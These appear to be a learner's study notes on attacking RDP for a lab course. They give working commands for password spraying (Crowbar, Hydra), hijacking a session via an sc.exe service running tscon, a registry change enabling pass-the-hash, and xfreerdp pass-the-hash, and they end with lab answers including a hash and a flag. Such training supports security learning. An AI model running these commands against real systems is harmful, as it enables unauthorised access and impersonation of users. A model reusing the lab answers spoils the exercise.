Attacking RDP: Study Notes
Core idea

RDP (Remote Desktop Protocol) — Microsoft's proprietary protocol for graphical remote access. Widely used by sysadmins and MSPs (managed service providers) to centrally administer systems. Convenient for admins, but also another attack surface.

Default port: TCP/3389

nmap -Pn -p3389 192.168.2.143

Confirms the service (ms-wbt-server).
Misconfigurations

RDP requires credentials, so the main attack vector is password guessing. An unauthenticated/no-password RDP service is possible but uncommon.

Caveat: Windows account lockout policies punish failed logins. Prefer password spraying (one password tried across many usernames) over brute force, to avoid lockouts.
Crowbar — RDP password spraying

crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'

    -b rdp — target protocol/module
    -s — target (CIDR notation, single host = /32)
    -U — username list file
    -c — the single password to spray

Result: RDP-SUCCESS : 192.168.220.142:3389 - administrator:password123
Hydra — RDP password spraying (alternative)

hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp

    -L — username list
    -p — single password

Note: the RDP module in Hydra is marked experimental, and RDP servers often reject many parallel connections — Hydra recommends -t 1/-t 4 (reduce threads) and -W 1/-W 3 (wait between attempts) to avoid overwhelming the service.
Logging in with valid creds

rdesktop -u admin -p password123 192.168.2.143

(xfreerdp is a common alternative client.) You'll typically be prompted to trust a self-signed/untrusted certificate — accept to proceed.
Protocol-specific attacks
RDP Session Hijacking

Scenario: you've compromised a machine and have local administrator. Another user is connected via RDP. You can hijack their session, impersonating them without needing their password — in AD, this could mean taking over a Domain Admin session.

Requirement: you need SYSTEM privileges (not just local admin) to actually perform the hijack, because it uses Microsoft's tscon.exe.

Concept:

tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}

Connects a target session ID into your own session name.

Getting SYSTEM: tools like PsExec or Mimikatz work, or a simpler trick — create a Windows service (services run as Local System by default) that executes tscon for you:

query user

Shows active sessions, e.g.:

>juurena   rdp-tcp#13   1  Active
 lewen     rdp-tcp#14   2  Active

Create the hijack service:

sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"

    sessionhijack — arbitrary service name
    binpath — command to run as SYSTEM (connects session 2 / lewen into your session rdp-tcp#13)

Start it:

net start sessionhijack

A new terminal appears as the hijacked user (lewen). From there, enumerate what privileges that account has — could be Help Desk/admin rights across many hosts, or even Domain Admin.

Important limitation: this technique no longer works on Server 2019.
RDP Pass-the-Hash (PtH)

Use case: you only have a user's NT hash (e.g., from a SAM dump) and can't crack it, but you need GUI access to something only available interactively.

Caveat — Restricted Admin Mode must be enabled on the target (disabled by default), or you'll hit:

    "Account restrictions prevent sign-in due to blank passwords, limited sign-in times, or policy restrictions."

Enable it via registry key DisableRestrictedAdmin under HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa:

reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

Connect using the hash with xfreerdp (/pth):

xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9

If successful, you're logged in via RDP as the target user, without ever knowing the cleartext password.

Caveat: doesn't work against every Windows system — but worth trying whenever you have an NTLM hash, know the user has RDP rights on a target, and GUI access would help the engagement.
Pentester's quick checklist

    nmap -p3389 <target> — confirm RDP is listening
    Try password spraying (Crowbar or Hydra) rather than brute force, to avoid lockouts
    On successful creds, connect with rdesktop or xfreerdp
    If you land local admin and see other RDP sessions active: escalate to SYSTEM (PsExec/Mimikatz, or the sc.exe service trick), then attempt session hijacking via tscon — remember it's dead on Server 2019
    If you only have an NT hash: check/enable Restricted Admin Mode, then try RDP PtH with xfreerdp /pth

One-line summary

    RDP attacks mostly come down to getting valid creds via password spraying, then either hijacking an active session with SYSTEM privileges, or skipping credentials entirely with Pass-the-Hash when Restricted Admin Mode is enabled.

Question 1
What is the name of the file that was left on the Desktop? (Format example: filename.txt)
> xfreerdp3 /v:10.129.203.13 /u:htb-rdp  /p:'HTBRocks!'
[text](../../../../../tmp/com.freerdp.client.cliprdr.8362/2/pentest-notes.txt)
Answer: pentest-notes.txt

Question 2
Which registry key needs to be changed to allow Pass-the-Hash with the RDP protocol?
Answer: DisableRestrictedAdmin

Question 3
Connect via RDP with the Administrator account and submit the flag.txt as you answer.

PS C:\Users\htb-rdp> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

>xfreerdp3 /v:10.129.203.13 /u:Administrator /pth:0E14B9D6330BF16C30B1924111104824
Answer: HTB{RDP_P4$$_Th3_H4$#}

